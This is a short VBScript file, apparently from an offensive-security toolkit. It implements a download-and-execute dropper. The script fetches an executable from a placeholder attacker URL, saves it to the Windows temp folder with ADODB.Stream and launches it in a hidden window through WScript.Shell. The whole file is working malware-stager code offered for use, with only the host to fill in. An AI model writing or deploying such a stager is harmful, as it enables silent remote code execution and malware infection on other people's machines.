'
' Example of downloading a binary file from the URL, saving it to the
' local filesystem and then launching.
'
' Mariusz B. / mgeeky, <mb@binary-offensive.com>
' (https://github.com/mgeeky)
'

downloadURL = "http://attacker/payload.exe"
saveAs = "%TEMP%\foo.exe"
parameters = ""

Dim sh: Set sh = CreateObject("WScript.Shell")
out = sh.ExpandEnvironmentStrings(saveAs)

' STEP 1: Download File
Dim xhr: Set xhr = CreateObject("Msxml2.ServerXMLHTTP")
xhr.Open "GET", downloadURL, False
xhr.Send

' STEP 2: Save binary file
If xhr.Status = 200 Then
    With CreateObject("Adodb.Stream")
        .Open
        .Type = 1
        .write xhr.responseBody
        .savetofile out, 2
    End With

    ' STEP 3: Execute file
    cmd = out & " " & parameters
    MsgBox cmd
    sh.Run cmd, 0, False

End If

Set sh = Nothing
Set xhr = Nothing